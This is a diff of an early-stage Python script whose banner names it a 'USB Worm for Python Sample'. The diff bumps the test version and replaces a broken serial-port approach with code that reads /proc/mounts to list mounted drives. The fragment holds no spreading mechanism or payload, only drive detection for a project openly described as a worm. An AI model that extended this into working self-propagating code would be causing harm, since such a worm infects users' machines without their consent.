@@ -6,7 +6,7 @@ print """''''''''''''''''''''''''''''''
 ' USB Worm for Python Sample '
 ''''''''''''''''''''''''''''''
 '                            '
-'   Testing Version 0.07     '
+'   Testing Version 0.09     '
 '                            '
 ''''''''''''''''''''''''''''''
 '   For Windows, OSX, Linux  '
@@ -21,8 +21,13 @@ def USBDetect():
 	if os.name == 'posix':
 		print "Found Unix, Linux, OSX, or Other POSIX System...\n"
 		try:
-			textfile = "\text.txt"
-			USBDir = [serial.Serial('/dev/sdb1'), serial.Serial('/dev/sdb2'), serial.Serial('/dev/sdb3'), serial.Serial('/dev/sdc1'), serial.Serial('/dev/sdc2'), serial.Serial('/dev/sdc3')]
+			d = {}
+			for l in file('/proc/mounts'):
+				if l[0] == '/':
+					l = l.split()
+					d[l[0]] = l[1]
+			import pprint
+			pprint.pprint(d)
 		except SerialException:
 			Error = True
 			print "Permission Error"
